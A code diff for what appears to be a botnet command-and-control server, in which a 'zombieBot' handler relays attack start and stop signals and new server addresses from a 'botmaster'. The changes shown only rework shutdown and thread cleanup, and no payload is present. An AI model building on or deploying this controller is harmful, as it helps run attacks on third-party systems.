@@ -50,6 +50,7 @@ def thread_for_zombieBot(c, addr):
                 c.send('0'.encode())
                 print('ending attack')
                 c.send(ip.encode())
+                closeServer(socket)
                 pom = 0
                 return
                 # if an attack stoped send IP of the new server (from botmaster)
@@ -92,7 +93,8 @@ def closeConnections():
         clientSockets.remove(s)
 
 
-def closeServer(socket):
+def closeServer(s):
+    print("closing server")
     closeConnections()
     for thread in thread_array:
         try:
@@ -106,10 +108,7 @@ def closeServer(socket):
 
     print("all threads terminated")
 
-    socket.detach()
-    socket.close()
-    quit(0)
-    sys.exit(0)
+    return
 
 
 if __name__ == '__main__':
@@ -160,7 +159,10 @@ if __name__ == '__main__':
             if t is not None:
                 if not t.is_alive():
                     print("cleaning up")
+                    time.sleep(5)
                     closeServer(socket)
+                    quit(0)
+                    sys.exit(0)
 
     except KeyboardInterrupt:
 
@@ -168,5 +170,6 @@ if __name__ == '__main__':
         closeServer(socket)
         quit()
         sys.exit(0)
+
 
     sys.exit(0)
